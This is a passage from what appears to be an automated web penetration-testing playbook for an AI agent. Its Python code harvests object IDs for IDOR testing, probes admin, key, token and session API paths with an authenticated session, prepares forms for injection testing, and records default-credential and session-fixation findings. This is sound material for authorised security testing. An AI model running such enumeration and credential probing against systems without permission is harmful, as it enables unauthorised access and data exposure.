                found.append({'type':'uuid','value':val,'location':'data-attr','url':page_url,'pattern':None})
            elif re.fullmatch(r'\\d{1,9}', val) and int(val) > 0:
                found.append({'type':'int','value':val,'location':'data-attr','url':page_url,'pattern':None})

        # 5 — IDs in JSON response body
        try:
            data = json.loads(body)
            id_keys = re.compile(r'\bid\b|_id$|_uuid$|_key$|_token$|_ref$|_account|_user|_order|_invoice|_resource', re.I)
            def walk_json(obj, path=''):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        if id_keys.search(k):
                            if isinstance(v, str) and UUID_RE.fullmatch(v):
                                found.append({'type':'uuid','value':v,'location':f'json:{path}.{k}',
                                              'url':page_url,'pattern':None})
                            elif isinstance(v, int) and 1 <= v <= 999999999:
                                found.append({'type':'int','value':str(v),'location':f'json:{path}.{k}',
                                              'url':page_url,'pattern':None})
                        walk_json(v, f'{path}.{k}')
                elif isinstance(obj, list):
                    for i, item in enumerate(obj[:50]):
                        walk_json(item, f'{path}[{i}]')
            walk_json(data)
        except Exception:
            pass

        return found

    # Run harvesting on every page Session A visited
    for page_url, body in {**ALL_PAGES, **AUTH_PAGES}.items():
        ids = extract_ids(page_url, body, {})
        for entry in ids:
            ID_INVENTORY.append({**entry, 'response_snippet': body[:400]})
            if entry.get('pattern'):
                pat = entry['pattern']
                OBJECT_MAP.setdefault(pat, [])
                # Avoid duplicates
                existing_urls = [e['url'] for e in OBJECT_MAP[pat]]
                if entry['url'] not in existing_urls:
                    OBJECT_MAP[pat].append({
                        'url':      entry['url'],
                        'id':       entry['value'],
                        'id_type':  entry['type'],
                        'response_snippet': body[:600],
                    })

    _G['OBJECT_MAP']   = OBJECT_MAP
    _G['ID_INVENTORY'] = ID_INVENTORY

    # Deduplicate and summarise
    print(f"\n=== OBJECT ID HARVEST COMPLETE ===")
    print(f"Unique endpoint patterns : {len(OBJECT_MAP)}")
    print(f"Total ID references      : {len(ID_INVENTORY)}")
    print(f"\nEndpoint patterns and collected IDs (Session A):")
    for pat, entries in sorted(OBJECT_MAP.items()):
        ids_preview = [e['id'] for e in entries[:5]]
        print(f"  {pat}  →  IDs: {ids_preview}")

    by_type = {}
    for e in ID_INVENTORY:
        by_type.setdefault(e['type'], set()).add(e['value'])
    for t, vals in by_type.items():
        print(f"  {t}: {len(vals)} unique values — e.g. {list(vals)[:4]}")
    ```

   IDs are now stored in OBJECT_MAP.

   ═══════════════════════════════════════════════════════
   SPA AUTHENTICATED API DISCOVERY (for SPAs — re-probe all APIs with auth token)
   ═══════════════════════════════════════════════════════
   If the app is a SPA, the HTML crawl above found very little.
   Re-probe ALL discovered API endpoints WITH the auth token to discover
   authenticated-only endpoints and build the attack surface.

   ```python
   import requests, time, json, re
   from urllib.parse import urljoin

   BASE    = _G['BASE']
   session = _G.get('session_a') or _G.get('session')
   is_spa  = _G.get('IS_SPA', False)
   CONFIRMED_APIS = _G.get('CONFIRMED_APIS', [])
   ALL_LINKS = _G.get('ALL_LINKS', set())
   AUTH_PAGES = _G.get('AUTH_PAGES', {})
   AUTH_FORMS = _G.get('AUTH_FORMS', [])
   AUTH_PARAMS = _G.get('AUTH_PARAMS', [])

   if is_spa or len(AUTH_FORMS) < 3:
       print("\n[SPA AUTH] Re-probing API endpoints with authenticated session...")

       # Re-probe all previously discovered APIs
       for api in CONFIRMED_APIS:
           url = api['url']
           if url in AUTH_PAGES:
               continue
           try:
               r = session.get(url, timeout=8, headers={'Accept': 'application/json'})
               if r.status_code in (200, 201):
                   AUTH_PAGES[url] = r.text
                   print(f"  [AUTH-API] {url} — {r.status_code} ({len(r.text)} bytes)")
                   # Extract JSON data for ID harvesting
                   try:
                       data = r.json()
                       if isinstance(data, dict) and 'data' in data:
                           items = data['data']
                           if isinstance(items, list) and items:
                               print(f"    Contains {len(items)} items")
                   except Exception:
                       pass
           except Exception:
               continue

       # Probe additional REST API paths with auth
       # Generic REST API paths to probe with auth (works on any app)
       AUTH_API_PATHS = [
           '/api/me', '/api/user', '/api/users', '/api/users/1', '/api/users/2',
           '/api/profile', '/api/account', '/api/whoami',
           '/api/orders', '/api/products', '/api/items', '/api/data',
           '/api/settings', '/api/config', '/api/preferences',
           '/api/admin', '/api/admin/users', '/api/admin/settings',
           '/api/files', '/api/uploads', '/api/export', '/api/import',
           '/api/feedback', '/api/comments', '/api/reviews', '/api/messages',
           '/api/keys', '/api/tokens', '/api/sessions',
           '/api/logs', '/api/audit', '/api/events',
           '/api/v1/users', '/api/v1/me', '/api/v1/admin',
           '/rest/user/whoami', '/rest/users', '/rest/products',
           '/rest/admin', '/rest/orders',
           '/profile', '/dashboard', '/admin', '/settings',
           '/account', '/administration',
       ]
       for path in AUTH_API_PATHS:
           url = BASE + path
           if url in AUTH_PAGES:
               continue
           try:
               r = session.get(url, timeout=6, headers={'Accept': 'application/json'})
               if r.status_code in (200, 201) and len(r.text) > 20:
                   AUTH_PAGES[url] = r.text
                   ALL_LINKS.add(url)
                   print(f"  [AUTH-API] {url} — {r.status_code} ({len(r.text)} bytes)")
                   # Track URL params for testing
                   if '?' in r.url:
                       from urllib.parse import urlparse, parse_qs
                       parsed = urlparse(r.url)
                       for param, vals in parse_qs(parsed.query).items():
                           AUTH_PARAMS.append({
                               'url': r.url, 'param': param,
                               'value': vals[0], 'method': 'GET'
                           })
               elif r.status_code == 401:
                   print(f"  [AUTH-API] {url} — 401 (auth required but token rejected)")
           except Exception:
               continue

       # For SPAs, also create "virtual forms" from API endpoints for testing phases
       # This ensures SQLi/XSS/SSTI phases have something to test
       api_login_fields = _G.get('api_login_fields', {})
       api_login_url = _G.get('api_login_url', '')
       if api_login_url and api_login_fields:
           virtual_form = {
               'page': api_login_url,
               'action': api_login_url,
               'method': 'post',
               'fields': [{'name': k, 'type': 'text', 'value': v} for k, v in api_login_fields.items()],
               'hidden': [],
               'csrf_token': None,
               'is_json_api': True,
           }
           AUTH_FORMS.append(virtual_form)
           print(f"  [VIRTUAL FORM] Added API login as form: {api_login_url}")

       # Add search endpoint as virtual form
       for link in ALL_LINKS:
           if 'search' in link.lower() and '?' not in link:
               virtual_search = {
                   'page': link,
                   'action': link,
                   'method': 'get',
                   'fields': [{'name': 'q', 'type': 'text', 'value': 'test'}],
                   'hidden': [],
                   'csrf_token': None,
                   'is_json_api': True,
               }
               AUTH_FORMS.append(virtual_search)
               print(f"  [VIRTUAL FORM] Added search: {link}?q=")

       _G['AUTH_PAGES']  = AUTH_PAGES
       _G['AUTH_FORMS']  = AUTH_FORMS
       _G['AUTH_PARAMS'] = AUTH_PARAMS
       _G['ALL_LINKS']   = ALL_LINKS

       print(f"\n[SPA AUTH] Auth API discovery complete:")
       print(f"  Auth pages  : {len(AUTH_PAGES)}")
       print(f"  Auth forms  : {len(AUTH_FORMS)} (including virtual API forms)")
       print(f"  Auth params : {len(AUTH_PARAMS)}")
   ```

   Proceed immediately to Phase 4.
   Session B credentials will be requested in Phase 17 (IDOR phase),
   after all other testing is complete.

   ═══════════════════════════════════════════════════════

---

**MANDATORY — Store authentication findings before moving on:**

```python
_G.setdefault('FINDINGS', [])

# Store default credential findings
if _G.get('discovered_creds'):
    _cred_list = ', '.join([f"{c['username']}/{c['password']}" for c in _G['discovered_creds'][:5]])
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': f"Default Credentials Found ({len(_G['discovered_creds'])} accounts)",
        'url': _G.get('login_url', BASE + '/login'),
        'evidence': f"Working credentials: {_cred_list}",
        'impact': 'Unauthorized access using default or weak credentials',
    })

# Store session fixation finding if detected
if _G.get('session_fixation'):
    _G['FINDINGS'].append({
        'severity': 'HIGH',
        'title': 'Session Fixation: Session ID Not Rotated After Login',
        'url': _G.get('login_url', BASE + '/login'),
        'evidence': 'Session cookie value remained the same before and after authentication',
        'impact': 'Attacker can fixate session ID and hijack authenticated session',
    })

print(f"[+] Stored auth findings: {len(_G.get('discovered_creds', []))} default creds")
```
